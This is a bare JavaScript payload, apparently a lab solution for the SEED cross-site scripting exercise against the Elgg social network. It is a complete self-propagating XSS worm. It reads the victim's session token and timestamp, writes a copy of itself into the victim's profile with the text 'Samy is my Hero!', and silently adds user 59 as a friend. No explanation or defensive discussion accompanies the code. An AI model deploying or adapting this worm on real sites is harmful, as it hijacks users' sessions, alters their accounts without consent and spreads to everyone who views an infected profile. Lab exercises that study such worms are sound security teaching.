<script type="text/javascript" id="worm">
window.onload = function(){
  var headerTag = "<script id=\"worm\" type=\"text/javascript\">";  
  var jsCode = document.getElementById("worm").innerHTML;
  var tailTag = "</" + "script>";
  
  //Put it all together with URI encoding
  var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
  
  //Set description field and access level
  var desc = "&description=Samy is my Hero!" + wormCode;
  desc += "&accesslevel[description]=2";
  
  //Get the name, guid, timestamp, and token
  var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
  var ts    = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
  var name  = "&name=" + elgg.session.user.name;
  var guid  = "&guid=" + elgg.session.user.guid;
   
  //Set the URL
  var sendposturl = "http://www.seed-server.com/action/profile/edit";
  var sendgeturl= "http://www.seed-server.com/action/friends/add" + "?friend=59" + token + ts;
  var content = token + ts + name + desc + guid;
  
  //Construct and send the Ajax request
  if (elgg.session.user.guid != 59){
    //modify profile
    var Ajax=null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendposturl, true);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);
  }
 
  //Create and send Ajax request to add friend
  Ajax=new XMLHttpRequest();
  Ajax.open("GET", sendgeturl, true);
  Ajax.send();
 }
 </script>